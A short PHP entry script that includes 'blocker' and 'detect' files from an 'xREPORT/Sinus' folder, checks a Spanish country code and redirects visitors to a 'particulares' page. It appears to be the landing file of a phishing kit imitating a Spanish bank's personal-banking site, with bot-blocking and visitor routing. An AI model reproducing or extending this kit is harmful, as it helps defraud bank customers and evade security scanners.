<?php

include("./xREPORT/Sinus/blocker.php");
include("./xREPORT/Sinus/detect.php");


if ($_SESSION['countrycode1'] == "ES") {
header('Location: particulares');
}

 else {

header('Location: particulares');

}




$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




?>